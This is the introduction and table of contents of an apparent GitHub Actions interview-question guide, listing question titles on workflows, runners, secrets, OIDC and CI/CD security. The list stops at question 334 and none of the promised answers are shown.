# GitHub Actions Interview Questions and Answers

_Last updated: October 28, 2026_

450 GitHub Actions interview questions with answers, split into three levels: 150 easy, 150 moderate and 150 advanced.

The answers target GitHub Actions as it works on GitHub.com in late 2026: Node 24 based actions, current runner images, reusable workflows, OIDC and the current security features. Examples use recent major versions of the official actions (like `actions/checkout@v6`). Newer majors come out often, so check the Marketplace or let Dependabot keep them up to date.

## Table of Contents

- [Easy Questions (1-150)](#easy-questions-1-150)
- [Moderate Questions (151-300)](#moderate-questions-151-300)
- [Advanced Questions (301-450)](#advanced-questions-301-450)

### Easy Questions (1-150)

- [1: What is GitHub Actions?](#1-what-is-github-actions)
- [2: What is CI/CD and how does GitHub Actions fit in?](#2-what-is-cicd-and-how-does-github-actions-fit-in)
- [3: What is a workflow?](#3-what-is-a-workflow)
- [4: Where do workflow files live?](#4-where-do-workflow-files-live)
- [5: What is an event in GitHub Actions?](#5-what-is-an-event-in-github-actions)
- [6: What is a job?](#6-what-is-a-job)
- [7: What is a step?](#7-what-is-a-step)
- [8: What is an action?](#8-what-is-an-action)
- [9: What is a runner?](#9-what-is-a-runner)
- [10: What is the difference between GitHub-hosted and self-hosted runners?](#10-what-is-the-difference-between-github-hosted-and-self-hosted-runners)
- [11: What does a basic workflow file look like?](#11-what-does-a-basic-workflow-file-look-like)
- [12: What does the on key do?](#12-what-does-the-on-key-do)
- [13: What does runs-on do?](#13-what-does-runs-on-do)
- [14: What is the difference between uses and run in a step?](#14-what-is-the-difference-between-uses-and-run-in-a-step)
- [15: What does actions/checkout do?](#15-what-does-actionscheckout-do)
- [16: Why do you need to check out the code in most workflows?](#16-why-do-you-need-to-check-out-the-code-in-most-workflows)
- [17: What is the GitHub Marketplace for actions?](#17-what-is-the-github-marketplace-for-actions)
- [18: How do you reference an action version?](#18-how-do-you-reference-an-action-version)
- [19: What does the name key do in a workflow?](#19-what-does-the-name-key-do-in-a-workflow)
- [20: What is run-name?](#20-what-is-run-name)
- [21: How do you trigger a workflow on push?](#21-how-do-you-trigger-a-workflow-on-push)
- [22: How do you trigger a workflow on pull requests?](#22-how-do-you-trigger-a-workflow-on-pull-requests)
- [23: How do you run a workflow manually?](#23-how-do-you-run-a-workflow-manually)
- [24: How do you run a workflow on a schedule?](#24-how-do-you-run-a-workflow-on-a-schedule)
- [25: How do you limit a workflow to certain branches?](#25-how-do-you-limit-a-workflow-to-certain-branches)
- [26: How do you run a workflow only when certain files change?](#26-how-do-you-run-a-workflow-only-when-certain-files-change)
- [27: What is the difference between branches and branches-ignore?](#27-what-is-the-difference-between-branches-and-branches-ignore)
- [28: How do you trigger a workflow when a tag is pushed?](#28-how-do-you-trigger-a-workflow-when-a-tag-is-pushed)
- [29: How do you trigger a workflow on a release?](#29-how-do-you-trigger-a-workflow-on-a-release)
- [30: Can a workflow have multiple triggers?](#30-can-a-workflow-have-multiple-triggers)
- [31: What are activity types in events?](#31-what-are-activity-types-in-events)
- [32: Do jobs run in parallel or in sequence by default?](#32-do-jobs-run-in-parallel-or-in-sequence-by-default)
- [33: How do you make one job wait for another?](#33-how-do-you-make-one-job-wait-for-another)
- [34: How do you run multiple commands in one step?](#34-how-do-you-run-multiple-commands-in-one-step)
- [35: What shell does run use by default?](#35-what-shell-does-run-use-by-default)
- [36: How do you change the shell for a step?](#36-how-do-you-change-the-shell-for-a-step)
- [37: What is working-directory?](#37-what-is-working-directory)
- [38: How do you set environment variables?](#38-how-do-you-set-environment-variables)
- [39: What is the env context?](#39-what-is-the-env-context)
- [40: What are default environment variables?](#40-what-are-default-environment-variables)
- [41: What is GITHUB_WORKSPACE?](#41-what-is-github_workspace)
- [42: What are GITHUB_SHA and GITHUB_REF?](#42-what-are-github_sha-and-github_ref)
- [43: What are secrets in GitHub Actions?](#43-what-are-secrets-in-github-actions)
- [44: How do you create a repository secret?](#44-how-do-you-create-a-repository-secret)
- [45: How do you use a secret in a workflow?](#45-how-do-you-use-a-secret-in-a-workflow)
- [46: What happens if you print a secret in the logs?](#46-what-happens-if-you-print-a-secret-in-the-logs)
- [47: What are configuration variables (vars)?](#47-what-are-configuration-variables-vars)
- [48: What is the difference between secrets and variables?](#48-what-is-the-difference-between-secrets-and-variables)
- [49: What is GITHUB_TOKEN?](#49-what-is-github_token)
- [50: What are expressions?](#50-what-are-expressions)
- [51: When can you leave out the ${{ }} around an expression?](#51-when-can-you-leave-out-the---around-an-expression)
- [52: What are contexts?](#52-what-are-contexts)
- [53: What is the github context?](#53-what-is-the-github-context)
- [54: What is the runner context?](#54-what-is-the-runner-context)
- [55: How do you use if conditions on steps?](#55-how-do-you-use-if-conditions-on-steps)
- [56: How do you use if conditions on jobs?](#56-how-do-you-use-if-conditions-on-jobs)
- [57: What are status check functions?](#57-what-are-status-check-functions)
- [58: How do you run a step even if a previous step failed?](#58-how-do-you-run-a-step-even-if-a-previous-step-failed)
- [59: What does continue-on-error do?](#59-what-does-continue-on-error-do)
- [60: What does timeout-minutes do?](#60-what-does-timeout-minutes-do)
- [61: What is the default job timeout?](#61-what-is-the-default-job-timeout)
- [62: What is a matrix strategy?](#62-what-is-a-matrix-strategy)
- [63: How do you test against several Node.js versions?](#63-how-do-you-test-against-several-nodejs-versions)
- [64: What does fail-fast do in a matrix?](#64-what-does-fail-fast-do-in-a-matrix)
- [65: What does actions/setup-node do?](#65-what-does-actionssetup-node-do)
- [66: How do you set up other languages like Python, Java or Go?](#66-how-do-you-set-up-other-languages-like-python-java-or-go)
- [67: What is caching in GitHub Actions?](#67-what-is-caching-in-github-actions)
- [68: How does the built-in cache in setup-node work?](#68-how-does-the-built-in-cache-in-setup-node-work)
- [69: What is an artifact?](#69-what-is-an-artifact)
- [70: How do you upload an artifact?](#70-how-do-you-upload-an-artifact)
- [71: How do you download an artifact?](#71-how-do-you-download-an-artifact)
- [72: What is the difference between artifacts and cache?](#72-what-is-the-difference-between-artifacts-and-cache)
- [73: How long are artifacts kept?](#73-how-long-are-artifacts-kept)
- [74: How do you see workflow logs?](#74-how-do-you-see-workflow-logs)
- [75: How do you re-run a workflow?](#75-how-do-you-re-run-a-workflow)
- [76: How do you cancel a running workflow?](#76-how-do-you-cancel-a-running-workflow)
- [77: How do you disable a workflow?](#77-how-do-you-disable-a-workflow)
- [78: What is a workflow run?](#78-what-is-a-workflow-run)
- [79: What are run_id, run_number and run_attempt?](#79-what-are-run_id-run_number-and-run_attempt)
- [80: What is a status badge?](#80-what-is-a-status-badge)
- [81: How do you skip a workflow for a commit?](#81-how-do-you-skip-a-workflow-for-a-commit)
- [82: What does ubuntu-latest mean?](#82-what-does-ubuntu-latest-mean)
- [83: What operating systems do GitHub-hosted runners support?](#83-what-operating-systems-do-github-hosted-runners-support)
- [84: What software comes preinstalled on hosted runners?](#84-what-software-comes-preinstalled-on-hosted-runners)
- [85: Is GitHub Actions free?](#85-is-github-actions-free)
- [86: How is usage counted for private repositories?](#86-how-is-usage-counted-for-private-repositories)
- [87: What is the Actions tab?](#87-what-is-the-actions-tab)
- [88: What YAML basics do you need for workflow files?](#88-what-yaml-basics-do-you-need-for-workflow-files)
- [89: What are common YAML mistakes in workflow files?](#89-what-are-common-yaml-mistakes-in-workflow-files)
- [90: How do you pass inputs to an action?](#90-how-do-you-pass-inputs-to-an-action)
- [91: What are action outputs?](#91-what-are-action-outputs)
- [92: Why would you give a step an id?](#92-why-would-you-give-a-step-an-id)
- [93: How do you set an output from a run step?](#93-how-do-you-set-an-output-from-a-run-step)
- [94: What is GITHUB_ENV?](#94-what-is-github_env)
- [95: What is GITHUB_PATH?](#95-what-is-github_path)
- [96: What is a job summary?](#96-what-is-a-job-summary)
- [97: What are workflow commands?](#97-what-are-workflow-commands)
- [98: How do you create an error or warning annotation?](#98-how-do-you-create-an-error-or-warning-annotation)
- [99: How do you group log lines?](#99-how-do-you-group-log-lines)
- [100: How do you mask a value in logs?](#100-how-do-you-mask-a-value-in-logs)
- [101: How do you turn on debug logging?](#101-how-do-you-turn-on-debug-logging)
- [102: What does the container key do?](#102-what-does-the-container-key-do)
- [103: What are service containers?](#103-what-are-service-containers)
- [104: How do you run a PostgreSQL database for tests?](#104-how-do-you-run-a-postgresql-database-for-tests)
- [105: What is an environment in GitHub Actions?](#105-what-is-an-environment-in-github-actions)
- [106: What are environment secrets?](#106-what-are-environment-secrets)
- [107: What is the needs context?](#107-what-is-the-needs-context)
- [108: What is the difference between the push and pull_request triggers?](#108-what-is-the-difference-between-the-push-and-pull_request-triggers)
- [109: What happens with workflows on pull requests from forks?](#109-what-happens-with-workflows-on-pull-requests-from-forks)
- [110: How do you define inputs for workflow_dispatch?](#110-how-do-you-define-inputs-for-workflow_dispatch)
- [111: What input types does workflow_dispatch support?](#111-what-input-types-does-workflow_dispatch-support)
- [112: What is a reusable workflow?](#112-what-is-a-reusable-workflow)
- [113: What is a composite action?](#113-what-is-a-composite-action)
- [114: What types of custom actions can you write?](#114-what-types-of-custom-actions-can-you-write)
- [115: What is action.yml?](#115-what-is-actionyml)
- [116: What does the defaults key do?](#116-what-does-the-defaults-key-do)
- [117: How do you run a step only on the main branch?](#117-how-do-you-run-a-step-only-on-the-main-branch)
- [118: How do you run a step only on a specific OS?](#118-how-do-you-run-a-step-only-on-a-specific-os)
- [119: What is concurrency in GitHub Actions?](#119-what-is-concurrency-in-github-actions)
- [120: How do you cancel older runs when a new commit is pushed?](#120-how-do-you-cancel-older-runs-when-a-new-commit-is-pushed)
- [121: What does the permissions key do?](#121-what-does-the-permissions-key-do)
- [122: What are the default permissions of GITHUB_TOKEN?](#122-what-are-the-default-permissions-of-github_token)
- [123: How do you run a workflow when a pull request is closed or merged?](#123-how-do-you-run-a-workflow-when-a-pull-request-is-closed-or-merged)
- [124: How do you check workflow syntax before pushing?](#124-how-do-you-check-workflow-syntax-before-pushing)
- [125: What is the GitHub CLI and how is it used with Actions?](#125-what-is-the-github-cli-and-how-is-it-used-with-actions)
- [126: How do you start a workflow from the GitHub CLI?](#126-how-do-you-start-a-workflow-from-the-github-cli)
- [127: What is Dependabot for GitHub Actions?](#127-what-is-dependabot-for-github-actions)
- [128: What is the difference between a workflow and an action?](#128-what-is-the-difference-between-a-workflow-and-an-action)
- [129: What is the difference between a job and a step?](#129-what-is-the-difference-between-a-job-and-a-step)
- [130: Do steps in the same job share files?](#130-do-steps-in-the-same-job-share-files)
- [131: Do jobs share files?](#131-do-jobs-share-files)
- [132: What is RUNNER_TEMP?](#132-what-is-runner_temp)
- [133: What happens after a job finishes on a GitHub-hosted runner?](#133-what-happens-after-a-job-finishes-on-a-github-hosted-runner)
- [134: Is there a limit on how many jobs can run at once?](#134-is-there-a-limit-on-how-many-jobs-can-run-at-once)
- [135: What does the hashFiles function do?](#135-what-does-the-hashfiles-function-do)
- [136: What string functions can you use in expressions?](#136-what-string-functions-can-you-use-in-expressions)
- [137: What do toJSON and fromJSON do?](#137-what-do-tojson-and-fromjson-do)
- [138: What literals and operators can you use in expressions?](#138-what-literals-and-operators-can-you-use-in-expressions)
- [139: How do you run a script file from the repository?](#139-how-do-you-run-a-script-file-from-the-repository)
- [140: How is GitHub Actions different from Jenkins?](#140-how-is-github-actions-different-from-jenkins)
- [141: What is GitHub Packages and how does it relate to Actions?](#141-what-is-github-packages-and-how-does-it-relate-to-actions)
- [142: What is the GitHub Container Registry?](#142-what-is-the-github-container-registry)
- [143: How do you build a Docker image in a workflow?](#143-how-do-you-build-a-docker-image-in-a-workflow)
- [144: What is an organization secret?](#144-what-is-an-organization-secret)
- [145: What happens when env is set at the workflow, job and step level?](#145-what-happens-when-env-is-set-at-the-workflow-job-and-step-level)
- [146: Why does a step fail as soon as one command fails?](#146-why-does-a-step-fail-as-soon-as-one-command-fails)
- [147: What are workflow templates?](#147-what-are-workflow-templates)
- [148: How do you deploy a static site to GitHub Pages with Actions?](#148-how-do-you-deploy-a-static-site-to-github-pages-with-actions)
- [149: How do workflow results show up on a pull request?](#149-how-do-workflow-results-show-up-on-a-pull-request)
- [150: What are required status checks?](#150-what-are-required-status-checks)

### Moderate Questions (151-300)

- [151: How would you set up a CI workflow for a Node.js project?](#151-how-would-you-set-up-a-ci-workflow-for-a-nodejs-project)
- [152: How do you cache npm dependencies with actions/cache?](#152-how-do-you-cache-npm-dependencies-with-actionscache)
- [153: How do cache keys and restore-keys work?](#153-how-do-cache-keys-and-restore-keys-work)
- [154: Which branches can use a cache?](#154-which-branches-can-use-a-cache)
- [155: What are the cache size limits and how is old cache removed?](#155-what-are-the-cache-size-limits-and-how-is-old-cache-removed)
- [156: When would you use actions/cache/restore and actions/cache/save separately?](#156-when-would-you-use-actionscacherestore-and-actionscachesave-separately)
- [157: How do you share data between jobs?](#157-how-do-you-share-data-between-jobs)
- [158: How do you pass outputs from one job to another?](#158-how-do-you-pass-outputs-from-one-job-to-another)
- [159: How do you build a matrix dynamically?](#159-how-do-you-build-a-matrix-dynamically)
- [160: How do include and exclude work in a matrix?](#160-how-do-include-and-exclude-work-in-a-matrix)
- [161: How do you limit how many matrix jobs run at once?](#161-how-do-you-limit-how-many-matrix-jobs-run-at-once)
- [162: How do you give matrix jobs readable names?](#162-how-do-you-give-matrix-jobs-readable-names)
- [163: How do you pass inputs and secrets to a reusable workflow?](#163-how-do-you-pass-inputs-and-secrets-to-a-reusable-workflow)
- [164: What does secrets: inherit do?](#164-what-does-secrets-inherit-do)
- [165: How do you return outputs from a reusable workflow?](#165-how-do-you-return-outputs-from-a-reusable-workflow)
- [166: What are the limits of reusable workflows?](#166-what-are-the-limits-of-reusable-workflows)
- [167: How do you call a reusable workflow from another repository?](#167-how-do-you-call-a-reusable-workflow-from-another-repository)
- [168: When would you use a reusable workflow and when a composite action?](#168-when-would-you-use-a-reusable-workflow-and-when-a-composite-action)
- [169: How do you write a composite action with inputs and outputs?](#169-how-do-you-write-a-composite-action-with-inputs-and-outputs)
- [170: How do you write a JavaScript action?](#170-how-do-you-write-a-javascript-action)
- [171: What are @actions/core and @actions/github?](#171-what-are-actionscore-and-actionsgithub)
- [172: How do you write a Docker container action?](#172-how-do-you-write-a-docker-container-action)
- [173: How do you publish an action to the Marketplace?](#173-how-do-you-publish-an-action-to-the-marketplace)
- [174: How should you version your own action?](#174-how-should-you-version-your-own-action)
- [175: What is actions/github-script?](#175-what-is-actionsgithub-script)
- [176: How do you comment on a pull request from a workflow?](#176-how-do-you-comment-on-a-pull-request-from-a-workflow)
- [177: How do you commit and push changes from a workflow?](#177-how-do-you-commit-and-push-changes-from-a-workflow)
- [178: Why don't pushes made with GITHUB_TOKEN start new workflow runs?](#178-why-dont-pushes-made-with-github_token-start-new-workflow-runs)
- [179: How can one workflow start another workflow?](#179-how-can-one-workflow-start-another-workflow)
- [180: What is the workflow_run event and when do you use it?](#180-what-is-the-workflow_run-event-and-when-do-you-use-it)
- [181: What is repository_dispatch?](#181-what-is-repository_dispatch)
- [182: When and how do you use a GitHub App token instead of GITHUB_TOKEN?](#182-when-and-how-do-you-use-a-github-app-token-instead-of-github_token)
- [183: When would you use a personal access token in a workflow?](#183-when-would-you-use-a-personal-access-token-in-a-workflow)
- [184: How do you set different permissions per job?](#184-how-do-you-set-different-permissions-per-job)
- [185: What permission scopes does GITHUB_TOKEN have?](#185-what-permission-scopes-does-github_token-have)
- [186: How do you deploy with environments and manual approval?](#186-how-do-you-deploy-with-environments-and-manual-approval)
- [187: What protection rules can an environment have?](#187-what-protection-rules-can-an-environment-have)
- [188: How do you make sure only main can deploy to production?](#188-how-do-you-make-sure-only-main-can-deploy-to-production)
- [189: What is OpenID Connect (OIDC) in GitHub Actions?](#189-what-is-openid-connect-oidc-in-github-actions)
- [190: How do you deploy to AWS using OIDC?](#190-how-do-you-deploy-to-aws-using-oidc)
- [191: How do you limit which workflows can assume a cloud role with OIDC?](#191-how-do-you-limit-which-workflows-can-assume-a-cloud-role-with-oidc)
- [192: What claims does the GitHub OIDC token contain?](#192-what-claims-does-the-github-oidc-token-contain)
- [193: How do you build and push a Docker image to GHCR?](#193-how-do-you-build-and-push-a-docker-image-to-ghcr)
- [194: How do you create image tags with docker/metadata-action?](#194-how-do-you-create-image-tags-with-dockermetadata-action)
- [195: How do you cache Docker layers in GitHub Actions?](#195-how-do-you-cache-docker-layers-in-github-actions)
- [196: How do you build multi-platform Docker images?](#196-how-do-you-build-multi-platform-docker-images)
- [197: How do you publish an npm package from a workflow?](#197-how-do-you-publish-an-npm-package-from-a-workflow)
- [198: How do you create a GitHub release from a workflow?](#198-how-do-you-create-a-github-release-from-a-workflow)
- [199: How can you automate versioning and changelogs?](#199-how-can-you-automate-versioning-and-changelogs)
- [200: How do you make sure a service container is ready before tests start?](#200-how-do-you-make-sure-a-service-container-is-ready-before-tests-start)
- [201: How do you connect to a service container from your steps?](#201-how-do-you-connect-to-a-service-container-from-your-steps)
- [202: How do you run Playwright end-to-end tests in GitHub Actions?](#202-how-do-you-run-playwright-end-to-end-tests-in-github-actions)
- [203: How do you split a slow test suite across parallel jobs?](#203-how-do-you-split-a-slow-test-suite-across-parallel-jobs)
- [204: How do you publish test results and coverage from a workflow?](#204-how-do-you-publish-test-results-and-coverage-from-a-workflow)
- [205: How do you deal with flaky tests in CI?](#205-how-do-you-deal-with-flaky-tests-in-ci)
- [206: How do you use concurrency safely for deployments?](#206-how-do-you-use-concurrency-safely-for-deployments)
- [207: What is the difference between workflow-level and job-level concurrency?](#207-what-is-the-difference-between-workflow-level-and-job-level-concurrency)
- [208: What happens to waiting runs in a concurrency group?](#208-what-happens-to-waiting-runs-in-a-concurrency-group)
- [209: How do you debug a failing workflow?](#209-how-do-you-debug-a-failing-workflow)
- [210: How can you get a shell on a runner to debug a problem?](#210-how-can-you-get-a-shell-on-a-runner-to-debug-a-problem)
- [211: How do you run workflows locally?](#211-how-do-you-run-workflows-locally)
- [212: How do you see the full event payload of a run?](#212-how-do-you-see-the-full-event-payload-of-a-run)
- [213: What problem do path filters cause with required status checks?](#213-what-problem-do-path-filters-cause-with-required-status-checks)
- [214: How do you run only the affected parts of a monorepo in CI?](#214-how-do-you-run-only-the-affected-parts-of-a-monorepo-in-ci)
- [215: How do you get the list of files changed in a pull request?](#215-how-do-you-get-the-list-of-files-changed-in-a-pull-request)
- [216: What does fetch-depth do in actions/checkout?](#216-what-does-fetch-depth-do-in-actionscheckout)
- [217: How do you check out another repository?](#217-how-do-you-check-out-another-repository)
- [218: How do you check out submodules?](#218-how-do-you-check-out-submodules)
- [219: What code does a pull_request workflow run on?](#219-what-code-does-a-pull_request-workflow-run-on)
- [220: What is the pull_request_target event?](#220-what-is-the-pull_request_target-event)
- [221: What is the difference between pull_request and pull_request_target?](#221-what-is-the-difference-between-pull_request-and-pull_request_target)
- [222: How do you handle pull requests from forks that need secrets?](#222-how-do-you-handle-pull-requests-from-forks-that-need-secrets)
- [223: What is the merge_group event?](#223-what-is-the-merge_group-event)
- [224: What are the caveats of scheduled workflows?](#224-what-are-the-caveats-of-scheduled-workflows)
- [225: How do you run a job only when a pull request has a certain label?](#225-how-do-you-run-a-job-only-when-a-pull-request-has-a-certain-label)
- [226: How do you run a job based on the commit message?](#226-how-do-you-run-a-job-based-on-the-commit-message)
- [227: What is the difference between a step's outcome and conclusion?](#227-what-is-the-difference-between-a-steps-outcome-and-conclusion)
- [228: How do you write a table to the job summary?](#228-how-do-you-write-a-table-to-the-job-summary)
- [229: What are problem matchers?](#229-what-are-problem-matchers)
- [230: How do you set a multi-line value in GITHUB_OUTPUT or GITHUB_ENV?](#230-how-do-you-set-a-multi-line-value-in-github_output-or-github_env)
- [231: Can you use YAML anchors in workflow files?](#231-can-you-use-yaml-anchors-in-workflow-files)
- [232: Where can configuration variables be defined and which one wins?](#232-where-can-configuration-variables-be-defined-and-which-one-wins)
- [233: How are secrets with the same name resolved?](#233-how-are-secrets-with-the-same-name-resolved)
- [234: What are the limits for secrets?](#234-what-are-the-limits-for-secrets)
- [235: How do you store a file or multi-line value as a secret?](#235-how-do-you-store-a-file-or-multi-line-value-as-a-secret)
- [236: How do workflows run for Dependabot pull requests?](#236-how-do-workflows-run-for-dependabot-pull-requests)
- [237: How do you auto-merge Dependabot pull requests?](#237-how-do-you-auto-merge-dependabot-pull-requests)
- [238: What are larger runners?](#238-what-are-larger-runners)
- [239: How do you run jobs on ARM64?](#239-how-do-you-run-jobs-on-arm64)
- [240: What should you watch for when running jobs on Windows and macOS?](#240-what-should-you-watch-for-when-running-jobs-on-windows-and-macos)
- [241: How do you set up a self-hosted runner?](#241-how-do-you-set-up-a-self-hosted-runner)
- [242: What are runner labels and runner groups?](#242-what-are-runner-labels-and-runner-groups)
- [243: How do you target a runner group in runs-on?](#243-how-do-you-target-a-runner-group-in-runs-on)
- [244: How do you write workflow scripts that work on Linux, Windows and macOS?](#244-how-do-you-write-workflow-scripts-that-work-on-linux-windows-and-macos)
- [245: How do you use a private image as a job container?](#245-how-do-you-use-a-private-image-as-a-job-container)
- [246: How do you use Docker Compose in a workflow?](#246-how-do-you-use-docker-compose-in-a-workflow)
- [247: How do you cache dependencies for pnpm and Yarn?](#247-how-do-you-cache-dependencies-for-pnpm-and-yarn)
- [248: Why use npm ci instead of npm install in CI?](#248-why-use-npm-ci-instead-of-npm-install-in-ci)
- [249: Should lint, tests and build be separate jobs or steps in one job?](#249-should-lint-tests-and-build-be-separate-jobs-or-steps-in-one-job)
- [250: How do you speed up a slow workflow?](#250-how-do-you-speed-up-a-slow-workflow)
- [251: How do you reduce GitHub Actions costs?](#251-how-do-you-reduce-github-actions-costs)
- [252: How do you retry a step that sometimes fails because of the network?](#252-how-do-you-retry-a-step-that-sometimes-fails-because-of-the-network)
- [253: How do rulesets work with GitHub Actions checks?](#253-how-do-rulesets-work-with-github-actions-checks)
- [254: How do you share workflows and actions across an organization?](#254-how-do-you-share-workflows-and-actions-across-an-organization)
- [255: How do you create workflow templates for an organization?](#255-how-do-you-create-workflow-templates-for-an-organization)
- [256: How do you organize many workflow files in one repository?](#256-how-do-you-organize-many-workflow-files-in-one-repository)
- [257: How do you deploy to Kubernetes from GitHub Actions?](#257-how-do-you-deploy-to-kubernetes-from-github-actions)
- [258: How do you deploy to a server over SSH?](#258-how-do-you-deploy-to-a-server-over-ssh)
- [259: How do you create preview deployments for pull requests?](#259-how-do-you-create-preview-deployments-for-pull-requests)
- [260: How do you clean up preview environments when a pull request closes?](#260-how-do-you-clean-up-preview-environments-when-a-pull-request-closes)
- [261: How do you send a Slack notification when a workflow fails?](#261-how-do-you-send-a-slack-notification-when-a-workflow-fails)
- [262: How do you open an issue automatically when a scheduled job fails?](#262-how-do-you-open-an-issue-automatically-when-a-scheduled-job-fails)
- [263: How do you list, cancel or re-run workflow runs through the API?](#263-how-do-you-list-cancel-or-re-run-workflow-runs-through-the-api)
- [264: How do you download an artifact from a different workflow run?](#264-how-do-you-download-an-artifact-from-a-different-workflow-run)
- [265: What changed with artifacts in upload-artifact v4 and later?](#265-what-changed-with-artifacts-in-upload-artifact-v4-and-later)
- [266: How do you combine artifacts from matrix jobs?](#266-how-do-you-combine-artifacts-from-matrix-jobs)
- [267: How do you control artifact retention and compression?](#267-how-do-you-control-artifact-retention-and-compression)
- [268: How do you install private npm packages from GitHub Packages?](#268-how-do-you-install-private-npm-packages-from-github-packages)
- [269: How do you authenticate to a private npm registry in CI?](#269-how-do-you-authenticate-to-a-private-npm-registry-in-ci)
- [270: How do you handle different settings for dev, staging and production?](#270-how-do-you-handle-different-settings-for-dev-staging-and-production)
- [271: How do you chain a staging deploy and a production deploy with approval?](#271-how-do-you-chain-a-staging-deploy-and-a-production-deploy-with-approval)
- [272: How do you use `needs.<job>.result` in conditions?](#272-how-do-you-use-needsjobresult-in-conditions)
- [273: How do you make one required check that covers all jobs?](#273-how-do-you-make-one-required-check-that-covers-all-jobs)
- [274: How do you trigger a workflow with a comment like /deploy?](#274-how-do-you-trigger-a-workflow-with-a-comment-like-deploy)
- [275: How do you make sure only maintainers can run comment commands?](#275-how-do-you-make-sure-only-maintainers-can-run-comment-commands)
- [276: What is the difference between the release event types?](#276-what-is-the-difference-between-the-release-event-types)
- [277: What glob patterns can you use in branch, tag and path filters?](#277-what-glob-patterns-can-you-use-in-branch-tag-and-path-filters)
- [278: How do you read data from the event payload?](#278-how-do-you-read-data-from-the-event-payload)
- [279: How do you use hashFiles with several patterns?](#279-how-do-you-use-hashfiles-with-several-patterns)
- [280: When is ${{ env.X }} different from $X in a run step?](#280-when-is--envx--different-from-x-in-a-run-step)
- [281: How do you run a job only if an earlier job produced a certain output?](#281-how-do-you-run-a-job-only-if-an-earlier-job-produced-a-certain-output)
- [282: How do you cancel a run from inside the workflow?](#282-how-do-you-cancel-a-run-from-inside-the-workflow)
- [283: How do you install system packages on the runner?](#283-how-do-you-install-system-packages-on-the-runner)
- [284: How do you check which runner image a job used?](#284-how-do-you-check-which-runner-image-a-job-used)
- [285: How do you write a job that only runs on the default branch, whatever its name is?](#285-how-do-you-write-a-job-that-only-runs-on-the-default-branch-whatever-its-name-is)
- [286: How do you automate issue triage with Actions?](#286-how-do-you-automate-issue-triage-with-actions)
- [287: How do you close stale issues and pull requests?](#287-how-do-you-close-stale-issues-and-pull-requests)
- [288: How do you label pull requests automatically by changed files?](#288-how-do-you-label-pull-requests-automatically-by-changed-files)
- [289: How do you run CodeQL code scanning in Actions?](#289-how-do-you-run-codeql-code-scanning-in-actions)
- [290: How do you block pull requests that add vulnerable dependencies?](#290-how-do-you-block-pull-requests-that-add-vulnerable-dependencies)
- [291: How do you upload results from other security scanners to GitHub?](#291-how-do-you-upload-results-from-other-security-scanners-to-github)
- [292: How do you give an expression a default when a value may be missing?](#292-how-do-you-give-an-expression-a-default-when-a-value-may-be-missing)
- [293: How do you handle several triggers differently in one workflow?](#293-how-do-you-handle-several-triggers-differently-in-one-workflow)
- [294: How do you run database migrations as part of integration tests?](#294-how-do-you-run-database-migrations-as-part-of-integration-tests)
- [295: How do you cache build tool output, like the Next.js cache?](#295-how-do-you-cache-build-tool-output-like-the-nextjs-cache)
- [296: How do you start your app in the background before E2E tests?](#296-how-do-you-start-your-app-in-the-background-before-e2e-tests)
- [297: How do you stop a workflow from running in forks?](#297-how-do-you-stop-a-workflow-from-running-in-forks)
- [298: How do you avoid duplicate runs on push and pull_request?](#298-how-do-you-avoid-duplicate-runs-on-push-and-pull_request)
- [299: How do you write a job summary from JavaScript?](#299-how-do-you-write-a-job-summary-from-javascript)
- [300: How do you test a custom action?](#300-how-do-you-test-a-custom-action)

### Advanced Questions (301-450)

- [301: How does GitHub Actions run a job under the hood?](#301-how-does-github-actions-run-a-job-under-the-hood)
- [302: What is the lifecycle of a job on a runner?](#302-what-is-the-lifecycle-of-a-job-on-a-runner)
- [303: What are pre and post steps in actions?](#303-what-are-pre-and-post-steps-in-actions)
- [304: How does the runner download and store actions?](#304-how-does-the-runner-download-and-store-actions)
- [305: When and where are expressions evaluated?](#305-when-and-where-are-expressions-evaluated)
- [306: What is script injection in GitHub Actions?](#306-what-is-script-injection-in-github-actions)
- [307: How do you prevent script injection?](#307-how-do-you-prevent-script-injection)
- [308: What is a "pwn request"?](#308-what-is-a-pwn-request)
- [309: How do you safely use artifacts from an untrusted workflow in workflow_run?](#309-how-do-you-safely-use-artifacts-from-an-untrusted-workflow-in-workflow_run)
- [310: What is cache poisoning in GitHub Actions?](#310-what-is-cache-poisoning-in-github-actions)
- [311: Why should you pin actions to a full commit SHA?](#311-why-should-you-pin-actions-to-a-full-commit-sha)
- [312: What happened in the tj-actions/changed-files compromise, and what did it teach?](#312-what-happened-in-the-tj-actionschanged-files-compromise-and-what-did-it-teach)
- [313: How do you enforce allowed actions and SHA pinning in an organization?](#313-how-do-you-enforce-allowed-actions-and-sha-pinning-in-an-organization)
- [314: What are immutable releases and how do they help with actions?](#314-what-are-immutable-releases-and-how-do-they-help-with-actions)
- [315: What is planned for dependency locking in GitHub Actions?](#315-what-is-planned-for-dependency-locking-in-github-actions)
- [316: How do you review a third-party action before using it?](#316-how-do-you-review-a-third-party-action-before-using-it)
- [317: How do you limit the damage a compromised step can do?](#317-how-do-you-limit-the-damage-a-compromised-step-can-do)
- [318: What does persist-credentials do in actions/checkout, and why turn it off?](#318-what-does-persist-credentials-do-in-actionscheckout-and-why-turn-it-off)
- [319: How does secret masking work, and where does it fail?](#319-how-does-secret-masking-work-and-where-does-it-fail)
- [320: How can a compromised dependency steal secrets during CI, and how do you defend?](#320-how-can-a-compromised-dependency-steal-secrets-during-ci-and-how-do-you-defend)
- [321: How can you restrict network access from runners?](#321-how-can-you-restrict-network-access-from-runners)
- [322: Why are self-hosted runners risky for public repositories?](#322-why-are-self-hosted-runners-risky-for-public-repositories)
- [323: What are ephemeral and just-in-time runners?](#323-what-are-ephemeral-and-just-in-time-runners)
- [324: How does Actions Runner Controller (ARC) work?](#324-how-does-actions-runner-controller-arc-work)
- [325: What are runner scale sets?](#325-what-are-runner-scale-sets)
- [326: How does container mode work in ARC?](#326-how-does-container-mode-work-in-arc)
- [327: How do you design runner access in a large organization?](#327-how-do-you-design-runner-access-in-a-large-organization)
- [328: How do you keep self-hosted runners up to date?](#328-how-do-you-keep-self-hosted-runners-up-to-date)
- [329: How do you handle caching on self-hosted runners?](#329-how-do-you-handle-caching-on-self-hosted-runners)
- [330: How do you customize the OIDC subject claim?](#330-how-do-you-customize-the-oidc-subject-claim)
- [331: How do you scope cloud permissions per environment with OIDC?](#331-how-do-you-scope-cloud-permissions-per-environment-with-oidc)
- [332: How does OIDC work with reusable workflows?](#332-how-does-oidc-work-with-reusable-workflows)
- [333: What are artifact attestations?](#333-what-are-artifact-attestations)
- [334: How do you verify an attestation?](#334-how-do-you-verify-an-attestation)
